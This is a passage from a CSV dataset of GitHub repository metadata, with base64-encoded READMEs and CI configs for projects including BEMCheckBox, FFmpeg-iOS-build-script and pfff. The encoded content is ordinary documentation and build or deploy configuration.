name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
eCBvYmplY3QgaXMgYG9uYCBvciBgb2ZmYC4gRGVmYXVsdHMgdG8gYE5PYC4g
IApFeGFtcGxlIHVzYWdlOgpgYGBvYmplY3RpdmUtYwpzZWxmLm15Q2hlY2tC
b3gub24gPSBZRVM7CmBgYAojIyMjIyBgc2V0T246YW5pbWF0ZWQ6YApKdXN0
IGxpa2UgYFVJU3dpdGNoYCwgKipCRU1DaGVja0JveCoqIHByb3ZpZGVzIGFu
IGluc3RhbmNlIG1ldGhvZCBgc2V0T246YW5pbWF0ZWQ6YCB0aGF0IHNldHMg
dGhlIHN0YXRlIG9mIHRoZSBjaGVja2JveCB0byBPbiBvciBPZmYsIG9wdGlv
bmFsbHkgYW5pbWF0aW5nIHRoZSB0cmFuc2l0aW9uLiAgCkV4YW1wbGUgdXNh
Z2U6CmBgYG9iamVjdGl2ZS1jCltzZWxmLm15Q2hlY2tCb3ggc2V0T246WUVT
IGFuaW1hdGVkOllFU107CmBgYAoKIyMjIFJlbG9hZGluZwpUaGUgaW5zdGFu
Y2UgbWV0aG9kIGByZWxvYWRgIGxldHMgeW91IHJlZHJhdyB0aGUgZW50aXJl
IGNoZWNrYm94LCBrZWVwaW5nIHRoZSBjdXJyZW50IGBvbmAgdmFsdWUuICAK
RXhhbXBsZSB1c2FnZTogIApgYGBvYmplY3RpdmUtYwpbc2VsZi5teUNoZWNr
Qm94IHJlbG9hZF0KYGBgCgojIyMgR3JvdXAgLyBSYWRpbyBCdXR0b24gRnVu
Y3Rpb25hbGl0eQoqKkJFTUNoZWNrQm94KiplcyBjYW4gZWFzaWx5IGJlIGdy
b3VwZWQgdG9nZXRoZXIgdG8gZm9ybSByYWRpbyBidXR0b24gZnVuY3Rpb25h
bGl0eS4gVGhpcyB3aWxsIGF1dG9tYXRpY2FsbHkgbWFuYWdlIHRoZSBzdGF0
ZSBvZiBlYWNoIGNoZWNrYm94IGluIHRoZSBncm91cCwgc28gdGhhdCBvbmx5
IG9uZSBpcyBzZWxlY3RlZCBhdCBhIHRpbWUsIGFuZCBjYW4gb3B0aW9uYWxs
eSByZXF1aXJlIHRoYXQgdGhlIGdyb3VwIGhhcyBhIHNlbGVjdGlvbiBhdCBh
bGwgdGltZXMuCgpgYGBvYmplY3RpdmUtYwpzZWxmLmdyb3VwID0gW0JFTUNo
ZWNrQm94R3JvdXAgZ3JvdXBXaXRoQ2hlY2tCb3hlczpAW3NlbGYuY2hlY2tC
b3gxLCBzZWxmLmNoZWNrQm94Miwgc2VsZi5jaGVja0JveDNdXTsKc2VsZi5n
cm91cC5zZWxlY3RlZENoZWNrQm94ID0gc2VsZi5jaGVja0JveDI7IC8vIE9w
dGlvbmFsbHkgc2V0IHdoaWNoIGNoZWNrYm94IGlzIHByZS1zZWxlY3RlZApz
ZWxmLmdyb3VwLm11c3RIYXZlU2VsZWN0aW9uID0gWUVTOyAvLyBEZWZpbmUg
aWYgdGhlIGdyb3VwIG11c3QgYWx3YXlzIGhhdmUgYSBzZWxlY3Rpb24KYGBg
CgpUbyBzZWUgd2hpY2ggY2hlY2tib3ggaXMgc2VsZWN0ZWQgaW4gdGhhdCBn
cm91cCwganVzdCBhc2sgZm9yIGl0OgpgYGBvYmplY3RpdmUtYwpCRU1DaGVj
a0JveCAqc2VsZWN0aW9uID0gc2VsZi5ncm91cC5zZWxlY3RlZENoZWNrQm94
OwpgYGAKClRvIG1hbnVhbGx5IHVwZGF0ZSB0aGUgc2VsZWN0aW9uIGZvciBh
IGdyb3VwLCBqdXN0IHNldCBpdDoKYGBgb2JqZWN0aXZlLWMKc2VsZi5ncm91
cC5zZWxlY3RlZENoZWNrQm94ID0gc2VsZi5jaGVja0JveDE7CmBgYAoKIyMj
IERlbGVnYXRlCioqQkVNQ2hlY2tCb3gqKiB1c2VzIGEgZGVsZWdhdGUgdG8g
cmVjZWl2ZSBjaGVjayBib3ggZXZlbnRzLiBUaGUgZGVsZWdhdGUgb2JqZWN0
IG11c3QgY29uZm9ybSB0byB0aGUgYEJFTUNoZWNrQm94RGVsZWdhdGVgIHBy
b3RvY29sLCB3aGljaCBpcyBjb21wb3NlZCBvZiB0d28gb3B0aW9uYWwgbWV0
aG9kczoKCi0gYGRpZFRhcENoZWNrQm94OmAgIApTZW50IHRvIHRoZSBkZWxl
Z2F0ZSBldmVyeSB0aW1lIHRoZSBjaGVjayBib3ggZ2V0cyB0YXBwZWQsIGFm
dGVyIGl0cyBwcm9wZXJ0aWVzIGFyZSB1cGRhdGVkIChgb25gKSwgYnV0IGJl
Zm9yZSB0aGUgYW5pbWF0aW9ucyBhcmUgY29tcGxldGVkLgoKLSBgYW5pbWF0
aW9uRGlkU3RvcEZvckNoZWNrQm94OmAgIApTZW50IHRvIHRoZSBkZWxlZ2F0
ZSBldmVyeSB0aW1lIHRoZSBjaGVjayBib3ggZmluaXNoZXMgYmVpbmcgYW5p
bWF0ZWQuCgojIyMgQ3VzdG9taXphdGlvbgoqKkJFTUNoZWNrQm94KiogaXMg
ZXhjbHVzaXZlbHkgY3VzdG9taXphYmxlIHRob3VnaCBwcm9wZXJ0aWVzLiAg
ClRoZSBmb2xsb3dpbmcgZGlhZ3JhbSBwcm92aWRlcyBhIGdvb2Qgb3ZlcnZp
ZXc6ICAKPHAgYWxpZ249ImNlbnRlciI+PGltZyBzcmM9Ii4vLmFzc2V0cy9C
RU1DaGVja0JveCBwcm9wZXJ0aWVzLmpwZyIvPjwvcD4KCgojIyMjIyBBcHBh
cmVuY2UgUHJvcGVydGllcwpgbGluZVdpZHRoYCAtIENHRmxvYXQgIApUaGUg
d2lkdGggb2YgdGhlIGxpbmVzIG9mIHRoZSBjaGVjayBtYXJrIGFuZCBib3gu
IERlZmF1bHRzIHRvIDIuMC4gIAoKYGhpZGVCb3hgIC0gQk9PTCAgCkJPT0wg
dG8gY29udHJvbCBpZiB0aGUgYm94IHNob3VsZCBiZSBoaWRkZW4gb3Igbm90
LiBTZXR0aW5nIHRoaXMgcHJvcGVydHkgdG8gYFlFU2Agd2lsbCBlc3NlbnRp
YWxseSB0dXJuIHRoZSBjaGVja2JveCBpbnRvIGEgY2hlY2sgbWFyay4gRGVm
YXVsdHMgdG8gYE5PYC4KCmBib3hUeXBlYCAtIEJFTUJveFR5cGUgICAKVGhl
IHR5cGUgb2YgYm94IHRvIHVzZS4gU2VlIGBCRU1Cb3hUeXBlYCBmb3IgcG9z
c2libGUgdmFsdWVzLiBEZWZhdWx0cyB0byBgQkVNQm94VHlwZUNpcmNsZWAu
IAo8cCBhbGlnbj0iY2VudGVyIj48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNo
ZWNrQm94IGJveCB0eXBlLmpwZyIvPjwvcD4KCmB0aW50Q29sb3JgIC0gVUlD
b2xvciAgClRoZSBjb2xvciBvZiB0aGUgYm94IHdoZW4gdGhlIGNoZWNrYm94
IGlzIE9mZi4KCmBvbkNoZWNrQ29sb3JgIC0gVUlDb2xvciAgClRoZSBjb2xv
ciBvZiB0aGUgY2hlY2sgbWFyayB3aGVuIGl0IGlzIE9uLgoKYG9uRmlsbENv
bG9yYCAtIFVJQ29sb3IgIApUaGUgY29sb3Igb2YgdGhlIGluc2lkZSBvZiB0
aGUgYm94IHdoZW4gaXQgaXMgT24uCgpgb25UaW50Q29sb3JgIC0gVUlDb2xv
ciAgClRoZSBjb2xvciBvZiB0aGUgbGluZSBhcm91bmQgdGhlIGJveCB3aGVu
IGl0IGlzIE9uLgoKIyMjIyMgQW5pbWF0aW9ucwpgYW5pbWF0aW9uRHVyYXRp
b25gIC0gQ0dGbG9hdCAgClRoZSBkdXJhdGlvbiBpbiBzZWNvbmRzIG9mIHRo
ZSBhbmltYXRpb25zLiBEZWZhdWx0cyB0byBgMC41YC4KCmBvbkFuaW1hdGlv
blR5cGVgIC0gQkVNQW5pbWF0aW9uVHlwZSAgClRoZSB0eXBlIG9mIGFuaW1h
dGlvbiB0byB1c2Ugd2hlbiB0aGUgY2hlY2tib3ggZ2V0cyBjaGVja2VkLiBE
ZWZhdWx0cyB0byBgQkVNQW5pbWF0aW9uVHlwZVN0cm9rZWAuIFNlZSBgQkVN
QW5pbWF0aW9uVHlwZWAgYmVsbG93IGZvciBwb3NzaWJsZSB2YWx1ZXMuCgpg
b2ZmQW5pbWF0aW9uVHlwZWAgLSBCRU1BbmltYXRpb25UeXBlICAKVGhlIHR5
cGUgb2YgYW5pbWF0aW9uIHRvIHVzZSB3aGVuIHRoZSBjaGVja2JveCBnZXRz
IHVuY2hlY2tlZC4gRGVmYXVsdHMgdG8gYEJFTUFuaW1hdGlvblR5cGVTdHJv
a2VgLiBTZWUgYEJFTUFuaW1hdGlvblR5cGVgIGJlbGxvdyBmb3IgcG9zc2li
bGUgdmFsdWVzLgoKYEJFTUFuaW1hdGlvblR5cGVgICAKVGhlIHBvc3NpYmxl
IHZhbHVlcyBmb3IgYG9uQW5pbWF0aW9uVHlwZWAgYW5kIGBvZmZBbmltYXRp
b25UeXBlYC4gIAotIGBCRU1BbmltYXRpb25UeXBlU3Ryb2tlYAo8cCBhbGln
bj0ibGVmdCI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveC1TdHJv
a2UuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9uVHlwZUZpbGxgCjxwIGFs
aWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNoZWNrQm94LUZp
bGwuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9uVHlwZUJvdW5jZWAKPHAg
YWxpZ249ImxlZnQiPjxpbWcgc3JjPSIuLy5hc3NldHMvQkVNQ2hlY2tCb3gt
Qm91bmNlLmdpZiIvPjwvcD4KCi0gYEJFTUFuaW1hdGlvblR5cGVGbGF0YAo8
cCBhbGlnbj0ibGVmdCI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0Jv
eC1GbGF0LmdpZiIvPjwvcD4KCi0gYEJFTUFuaW1hdGlvblR5cGVPbmVTdHJv
a2VgCjxwIGFsaWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNo
ZWNrQm94LU9uZS1TdHJva2UuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9u
VHlwZUZhZGVgCjxwIGFsaWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRz
L0JFTUNoZWNrQm94LUZhZGUuZ2lmIi8+PC9wPgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU3LjMKCnNj
cmlwdDoKLSB4Y29kZWJ1aWxkIGNsZWFuIGJ1aWxkIHRlc3QgLXByb2plY3Qg
IlNhbXBsZSBQcm9qZWN0L0NoZWNrQm94Lnhjb2RlcHJvaiIgLXNjaGVtZSBD
aGVja0JveCAtc2RrIGlwaG9uZXNpbXVsYXRvcjkuMyAtZGVzdGluYXRpb24g
Ik9TPTkuMyxuYW1lPWlQaG9uZSA1UyIgT05MWV9BQ1RJVkVfQVJDSD1OTwo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'FFmpeg-iOS-build-script',12207953,b'Shell scripts to build FFmpeg for iOS and tvOS',b'Shell',3,2393,,2393,False,b'https://api.github.com/repos/kewlbear/FFmpeg-iOS-build-script/forks',"IyBGRm1wZWcgaU9TIGJ1aWxkIHNjcmlwdAoKWyFbQnVpbGQgU3RhdHVzXSho
dHRwczovL3RyYXZpcy1jaS5vcmcva2V3bGJlYXIvRkZtcGVnLWlPUy1idWls
ZC1zY3JpcHQuc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1j
aS5vcmcva2V3bGJlYXIvRkZtcGVnLWlPUy1idWlsZC1zY3JpcHQpCgpUaGlz
IGlzIGEgc2hlbGwgc2NyaXB0IHRvIGJ1aWxkIEZGbXBlZyBsaWJyYXJpZXMg
Zm9yIGlPUyBhbmQgdHZPUyBhcHBzLgoKVGVzdGVkIHdpdGg6CgoqIEZGbXBl
ZyA0LjIKKiBYY29kZSAxMC4xCgojIyBSZXF1aXJlbWVudHMKCiogaHR0cHM6
Ly9naXRodWIuY29tL2xpYmF2L2dhcy1wcmVwcm9jZXNzb3IKKiB5YXNtIDEu
Mi4wCgojIyBVc2FnZQoKVXNlIGJ1aWxkLWZmbXBlZy10dm9zLnNoIGZvciB0
dk9TLgoKKiBUbyBidWlsZCBldmVyeXRoaW5nOgoKICAgICAgICAuL2J1aWxk
LWZmbXBlZy5zaAoKKiBUbyBidWlsZCBhcm02NCBsaWJyYXJpZXM6CgogICAg
ICAgIC4vYnVpbGQtZmZtcGVnLnNoIGFybTY0CgoqIFRvIGJ1aWxkIGZhdCBs
aWJyYXJpZXMgZm9yIGFybXY3IGFuZCB4ODZfNjQgKDY0LWJpdCBzaW11bGF0
b3IpOgoKICAgICAgICAuL2J1aWxkLWZmbXBlZy5zaCBhcm12NyB4ODZfNjQK
CiogVG8gYnVpbGQgZmF0IGxpYnJhcmllcyBmcm9tIHNlcGFyYXRlbHkgYnVp
bHQgdGhpbiBsaWJyYXJpZXM6CgogICAgICAgIC4vYnVpbGQtZmZtcGVnLnNo
IGxpcG8KCiMjIERvd25sb2FkCgpZb3UgY2FuIGRvd25sb2FkIGEgYmluYXJ5
IGZvciBGRm1wZWcgNC4yIHJlbGVhc2UgYXQgaHR0cHM6Ly9kb3dubG9hZHMu
c291cmNlZm9yZ2UubmV0L3Byb2plY3QvZmZtcGVnLWlvcy9mZm1wZWctaW9z
LW1hc3Rlci50YXIuYnoyCgojIyBFeHRlcm5hbCBsaWJyYXJpZXMKCllvdSBz
aG91bGQgbGluayB5b3VyIGFwcCB3aXRoCgoqIGxpYnouZHlsaWIKKiBsaWJi
ejIuZHlsaWIKKiBsaWJpY29udi5keWxpYgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCgpzY3JpcHQ6IC4vYnVpbGQtZmZtcGVn
LnNoIDI+LnN0ZGVycgoKZW52OgogICAgZ2xvYmFsOgogICAgICAgIC0gc2Vj
dXJlOiAiUE9vZUIwd05hSVBLT1J1OHNvbEJmRHdTYmdrNmJzeFNKcFZXcVZh
d2xlZFlpWkhuWUxYVUR6RGF3b0tPWHpqSjFvUVFpbHVaV0NtditSWERBOWd0
aFROckgwOGZ1VUV2c1VIQnI3c2dIcWFPc2tFYktOL3MyOTYyRkx5NEZSWmRR
eVpGa3Jyek5jcW5jM3hheGdGNVp5alJld3RCMEppb2FPU0FQRUg4QUxjPSIK
ICAgICAgICAtIFRBUkJBTEw9ZmZtcGVnLWlvcy0kVFJBVklTX0JSQU5DSC50
YXIuYnoyCgphZnRlcl9zdWNjZXNzOgogICAgLSB0YXIgY2pmICRUQVJCQUxM
IEZGbXBlZy1pT1MgLnN0ZGVyciBzY3JhdGNoLyovY29uZmlnLmxvZyBmZm1w
ZWcqL0xJQ0VOU0UubWQgZmZtcGVnKi9DT1BZSU5HLiogUkVBRE1FLm1kCiAg
ICAtIG9wZW5zc2wgYWVzLTI1Ni1jYmMgLWsgIiRzZWNyZXQiIC1pbiAuc2Yg
LWQgLWEgLW91dCBpZF9zZgogICAgLSBjaG1vZCA2MDAgaWRfc2YKICAgIC0g
c2NwIC1pIGlkX3NmIC1vICdTdHJpY3RIb3N0S2V5Q2hlY2tpbmcgbm8nICRU
QVJCQUxMIGtvb2xiZWFyQGZycy5zb3VyY2Vmb3JnZS5uZXQ6L2hvbWUvZnJz
L3Byb2plY3QvZmZtcGVnLWlvcwoKYWZ0ZXJfZmFpbHVyZTogY2F0IC5zdGRl
cnIKCm9zeF9pbWFnZTogeGNvZGU4LjMKCnN1ZG86IGZhbHNlCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogQ0kKCm9uOiBbcHVzaF0KCmpvYnM6CiAgYnVpbGQ6CgogICAgcnVu
cy1vbjogbWFjT1MtbGF0ZXN0CiAgICAKICAgIHN0ZXBzOgogICAgLSB1c2Vz
OiBhY3Rpb25zL2NoZWNrb3V0QHYxCiAgICAtIG5hbWU6IGJ1aWxkCiAgICAg
IHJ1bjogLi9idWlsZC1mZm1wZWcuc2ggMj4uc3RkZXJyCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pfff',932626,"b'Tools for code analysis, visualizations, or style-preserving source transformation.'",b'OCaml',36,2393,,2393,False,b'https://api.github.com/repos/facebookarchive/pfff/forks',"CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBmZmYKClshW0J1aWxk
IFN0YXR1c10oaHR0cHM6Ly90cmF2aXMtY2kub3JnL2ZhY2Vib29rL3BmZmYu
c3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvZmFj
ZWJvb2svcGZmZikKCnBmZmYgaXMgYSBzZXQgb2YgdG9vbHMgYW5kIEFQSXMg
dG8gcGVyZm9ybSBzdGF0aWMgYW5hbHlzaXMsIGNvZGUKdmlzdWFsaXphdGlv
bnMsIGNvZGUgbmF2aWdhdGlvbnMsIG9yIHN0eWxlLXByZXNlcnZpbmcgc291
cmNlLXRvLXNvdXJjZQp0cmFuc2Zvcm1hdGlvbnMgc3VjaCBhcyByZWZhY3Rv
cmluZ3Mgb24gc291cmNlIGNvZGUuIFRoZXJlIGlzIGdvb2QKc3VwcG9ydCBm
b3IgQywgSmF2YSwgSmF2YXNjcmlwdCBhbmQgUEhQLiBUaGVyZSBpcyBhbHNv
IHByZWxpbWluYXJ5CnN1cHBvcnQgZm9yIG90aGVyIGxhbmd1YWdlcyBzdWNo
IGFzIEMrKywgUnVzdCwgQyMsIEh0bWwsIENTUywgRXJsYW5nLApMaXNwLCBI
YXNrZWxsLCBQeXRob24sIE9QQSBhbmQgU1FMLiBUaGVyZSBpcyBhbHNvIHZl
cnkgZ29vZCBzdXBwb3J0IGZvcgpPQ2FtbCBjb2RlIHNvIHRoYXQgdGhlIGZy
YW1ld29yayBjYW4gYmUgdXNlZCBvbiB0aGUgY29kZSBvZiBwZmZmCml0c2Vs
Zi4KCkZvciBlYWNoIGxhbmd1YWdlcyB0aGVyZSBhcmUgbWFpbmx5IDIgbGli
cmFyaWVzLCBmb3IgaW5zdGFuY2UKcGFyc2luZ19waHAuY21hIGFuZCBhbmFs
eXNpc19waHAuY21hLCB0aGF0IHlvdSBjYW4KZW1iZWQgaW4geW91ciBvd24g
YXBwbGljYXRpb24gaWYgeW91IG5lZWQgdG8gcHJvY2VzcyBQSFAgY29kZS4g
U2VlIHRoZQpkZW1vcy8gZGlyZWN0b3J5IGZvciBleGFtcGxlIG9mIHVzZSBv
ZiB0aGUgcGZmZiBBUEkuIFNlZSBhbHNvCmRvY3MvbWFudWFsL1BhcnNpbmdf
eHh4LnBkZiBhbmQgZG9jcy9tYW51YWwvQW5hbHl6aXNfeHh4LnBkZiBmb3IK
bW9yZSBkb2N1bWVudGF0aW9uIG9uIGhvdyB0byB1c2Ugb3IgZXh0ZW5kIHBm
ZmYuCgpwZmZmIGlzIGFsc28gbWFkZSBvZiBmZXcgdG9vbHM6CiAtIHBmZmYs
IHdoaWNoIGFsbG93cyB0byB0ZXN0IHRoZSBkaWZmZXJlbnQgcGFyc2VycyBv
biBhIHNpbmdsZSBmaWxlCiAtIHNjaGVjaywgYSBidWcgZmluZGVyCiAtIHN0
YWdzLCBhbiBFbWFjcyB0YWcgZ2VuZXJhdG9yCiAtIHNncmVwLCBhIHN5bnRh
Y3RpY2FsIGdyZXAKIC0gc3BhdGNoLCBhIHN5bnRhY3RpY2FsIHBhdGNoCiAt
IGNvZGVtYXAsIHdoaWNoIGlzIGEgZ3RrIGFuZCBjYWlybyBiYXNlZCBzb3Vy
Y2UgY29kZQogICB2aXN1YWxpemVyL25hdmlnYXRvci9zZWFyY2hlciBsZXZl
cmFnaW5nCiAgIHRoZSBpbmZvcm1hdGlvbiBjb21wdXRlZCBwcmV2aW91c2x5
IGJ5IHBmZmZfZGIgYW5kIGNvZGVncmFwaC4KIC0gY29kZWdyYXBoLCBhIHNv
dXJjZSBjb2RlIGluZGV4ZXIgYW5kIHBhY2thZ2UvbW9kdWxlL2NsYXNzCiAg
IGRlcGVuZGVuY3kgdmlzdWFsaXplcgogLSBjb2RlcXVlcnksIGFuIGludGVy
YWN0aXZlIHRvb2wgYSBsYSBTUUwgdG8gcXVlcnkgaW5mb3JtYXRpb24KICAg
YWJvdXQgdGhlIHN0cnVjdHVyZSBvZiBhIGNvZGViYXNlIHVzaW5nIFByb2xv
ZyBhcyB0aGUgcXVlcnkgZW5naW5lCiAtIHBmZmZfZGIsIHdoaWNoIGRvZXMg
c29tZSBnbG9iYWwgYW5hbHlzaXMgb24gYSBzZXQgb2Ygc291cmNlIGZpbGVz
IGFuZAogICBzdG9yZSB0aGUgZGF0YSBpbiBhIG1hcnNoYWxsZWQgZm9ybSBp
biBhIGZpbGUgc29tZXdoZXJlIChlLmcuIC90bXAvZGIuanNvbikKCkZvciBt
b3JlIGluZm9ybWF0aW9uLCBsb29rIGF0IHRoZSBwZmZmIHdpa2kgaGVyZToK
IGh0dHA6Ly9naXRodWIuY29tL2ZhY2Vib29rL3BmZmYvd2lraS9NYWluCmFz
IHdlbGwgYXMgdGhlIGRvY3MvbWFudWFsLyBkaXJlY3RvcnkuCgpVc2FnZSBm
b3IgcGZmZjoKLS0tLS0tLS0tLS0tLS0tLS0KCiAgICQgLi9wZmZmIC1wYXJz
ZV9waHAgZGVtb3MvZm9vLnBocAoKb3IKCiAgICQgLi9wZmZmIC1kdW1wX3Bo
cCBkZW1vcy9mb28ucGhwCgpZb3UgY2FuIGFsc28gbG9vayBhdCAuL3BmZmYg
LS1oZWxwCgpVc2FnZSBmb3IgcGZmZl9kYjoKLS0tLS0tLS0tLS0tLS0tLS0t
LQoKICAgJCAuL3BmZmZfZGIgLWxhbmcgbWwgLW8gL3RtcC9wZmZmLmpzb24g
fi9wZmZmCgp0byBhbmFseXplIGFsbCB0aGUgLm1sIGFuZCAubWxpIGZpbGVz
IHVuZGVyIH4vcGZmZiBhbmQgc3RvcmUgbWV0YWRhdGEKaW5mb3JtYXRpb24g
KHRoZSBkYXRhYmFzZSkgaW4gL3RtcC9wZmZmLmpzb24KClVzYWdlIGZvciBj
b2RlbWFwOgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiAgJCAuL2NvZGVt
YXAgfi9wZmZmCgpUaGlzIHNob3VsZCBsYXVuY2ggYSBndGstYmFzZWQgR1VJ
IHRoYXQgYWxsb3dzIHlvdSB0byB2aXN1YWxpemUKc291cmNlIGNvZGUgYW5k
IHBlcmZvcm0gc29tZSBjb2RlIHNlYXJjaC4KClVzYWdlIGZvciBjb2RlZ3Jh
cGg6Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKICAkIC4vY29kZWdyYXBo
IC1sYW5nIGNtdCAtYnVpbGQgfi9wZmZmCgp0byBnZW5lcmF0ZSBhIGdyYXBo
X2NvZGUubWFyc2hhbGwgZmlsZSBpbiB+L3BmZmYgY29udGFpbmluZwphbGwg
ZGVwZW5kZW5jeSBpbmZvcm1hdGlvbiBhYm91dCB0aGUgcGZmZiBjb2RlYmFz
ZSB1c2luZyB0aGUKdHlwZWQgYnl0ZWNvZGUgLmNtdCBmaWxlcyBnZW5lcmF0
ZWQgZHVyaW5nIHRoZSBjb21waWxhdGlvbiBvZiBwZmZmLgoKICAkIC4vY29k
ZWdyYXBoIH4vcGZmZgoKVGhpcyBzaG91bGQgbGF1bmNoIGEgZ3RrLWJhc2Vk
IEdVSSB0aGF0IGFsbG93cyB5b3UgdG8gdmlzdWFsaXplCnNvdXJjZSBjb2Rl
IGRlcGVuZGVuY2llcy4KCk1vcmUgaW5mb3JtYXRpb24KLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQoKTG9vayBhdCB0aGUgcGZmZiB3aWtpIGhlcmU6IGh0dHA6
Ly9naXRodWIuY29tL2ZhY2Vib29rL3BmZmYvd2lraS9NYWluCg==
",,"bGFuZ3VhZ2U6IGMKc2NyaXB0OiBiYXNoIC1leCB0cmF2aXMtY2kuc2gKCm5v
dGlmaWNhdGlvbnM6CiAgZW1haWw6CiAgICByZWNpcGllbnRzOgogICAgICAt
IHlvYW5uLnBhZGlvbGVhdUBnbWFpbC5jb20KICBvbl9zdWNjZXNzOiBjaGFu
Z2UKICBvbl9mYWlsdXJlOiBhbHdheXMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'django-rest-swagger',10674033,b'Swagger Documentation Generator for Django REST Framework: deprecated',b'Python',151,2393,,2393,False,b'https://api.github.com/repos/marcgibbons/django-rest-swagger/forks',"IyBEamFuZ28gUkVTVCBTd2FnZ2VyOiBkZXByZWNhdGVkICgyMDE5LTA2LTA0
KQoKVGhpcyBwcm9qZWN0IGlzIG5vIGxvbmdlciBiZWluZyBtYWludGFpbmVk
LiBQbGVhc2UgY29uc2lkZXIgKipkcmYteWFzZyoqIGFzIGFuIGFsdGVybmF0
